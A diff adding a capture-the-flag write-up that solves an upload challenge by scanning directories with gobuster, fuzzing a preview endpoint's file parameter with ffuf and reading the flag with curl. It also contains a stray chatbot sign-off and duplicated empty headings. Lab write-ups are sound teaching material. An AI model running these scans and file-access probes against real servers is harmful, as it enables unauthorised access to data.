@@ -384,6 +384,103 @@ You're part of a security audit. Can you craft an upload that causes unintended 
 
 ### Methodology
 
+### ✅ Step-by-Step Exploitation
+
+#### 🔎 1. Initial Recon
+
+Visited the root page:
+
+```
+http://68.183.205.254:34715/
+```
+
+HTML revealed a basic welcome page with a link to `/upload`.
+
+Navigated to `/upload`, revealed an upload form:
+
+```html
+<form method="POST" enctype="multipart/form-data">
+    <input type="file" name="script" required />
+    <button type="submit">Upload</button>
+</form>
+```
+
+Attempted to upload a benign `.txt` file (named `attacker.txt`) →  
+Received this error:
+
+```html
+<pre>Script does not contain expected structure. </pre>
+```
+
+---
+
+#### 🧭 2. Directory Discovery with Gobuster
+
+```bash
+gobuster dir -u http://68.183.205.254:34715/ -w ~/SecLists/Discovery/Web-Content/common.txt
+```
+
+Discovered:
+
+- `/upload` (Upload form – already known)
+    
+- `/preview` (New!)
+    
+
+---
+
+#### 🔍 3. File Fuzzing with FFUF
+
+```bash
+ffuf -u "http://68.183.205.254:34715/preview?file=FUZZ" \
+     -w ~/SecLists/Discovery/Web-Content/common.txt \
+     -e .txt,.php,.log,.bak -mc 200 -ac
+```
+
+💥 Success:  
+Discovered file:
+
+```
+flag.txt [Status: 200]
+```
+
+---
+
+#### 📦 4. Retrieved the Flag
+
+```bash
+curl "http://68.183.205.254:34715/preview?file=flag.txt"
+```
+
+📥 Output:
+
+```html
+<pre>h4kit{insecure_pipeline_exec_4212f73ceac2}</pre>
+```
+
+---
+
+### 🏁 Flag
+
+```
+h4kit{insecure_pipeline_exec_4212f73ceac2}
+```
+
+---
+
+### 🧠 Lessons Learned
+
+- Even when upload interfaces block execution, **improper access control on file previews** can lead to **direct leakage**.
+    
+- Lack of filename sanitization or access control allowed a classic **predictable file access** vulnerability.
+    
+- Always test both the **upload** and **preview/browse** features when auditing for web-based file handling.
+    
+
+---
+
+Let me know if you'd like this exported as a Markdown file or styled for blog/portfolio use.
+
 ### 🚩Flag Captured: 
 
 ### Lessons Learned
